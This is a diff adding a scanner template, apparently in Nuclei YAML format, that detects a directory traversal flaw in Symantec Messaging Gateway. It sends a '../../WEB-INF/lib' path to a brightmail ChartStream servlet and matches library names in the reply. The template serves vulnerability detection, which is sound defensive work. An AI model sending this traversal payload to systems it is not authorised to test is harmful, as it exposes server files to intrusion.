@@ -1,0 +1,20 @@
+id: symantec-messaging-gateway-directory-traversal
+info:
+  name: Symantec Messaging Gateway Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/lib"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "jakarta-commons"
+        part: body
+      - type: word
+        words:
+          - "sun-activation"
+        part: body
